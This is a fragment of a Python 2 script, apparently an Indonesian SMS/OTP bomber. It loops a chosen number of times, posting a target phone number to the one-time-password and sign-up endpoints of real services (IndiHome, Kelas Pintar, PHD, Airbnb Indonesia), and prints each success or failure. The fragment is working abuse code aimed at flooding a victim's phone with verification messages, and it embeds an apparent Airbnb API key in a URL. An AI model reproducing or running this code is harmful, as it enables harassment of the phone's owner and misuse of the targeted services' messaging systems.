        ...
        if ab =='':
            ...
            try:
                ...
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data=dat).text
                        if 'Kode verifikasi telah dikirim' in str(x):
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
            ...
            try:
                ...
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.kelaspintar.id/user/otpverification', headers=hd, data=dat).text
                        if 'successfully' in str(x):
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
                    except requests.exceptions.ConnectionError:
            ...
            try:
                ...
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.phd.co.id/en/users/createNewUser', headers=hd, data=dat).text
                        if 'OK' in str(x):
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
            ...
            try:
                ...
                for i in range(int(jumla)):
                    try:
                        a += 1
                        x = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, data=datajson).text
                        if 'success' in str(x):
                            print '     \x1b[1;97m{\x1b[1;92m'+str(a)+'\x1b[1;97m} \x1b[1;92m'+(x)+' \x1b[1;97m=> \x1b[0;37m'+nomor
                        else:
                            print '     \x1b[1;97m{\x1b[1;91m'+str(a)+'\x1b[1;97m} \x1b[1;91mGagal \x1b[1;97m=> \x1b[0;37m'+nomor
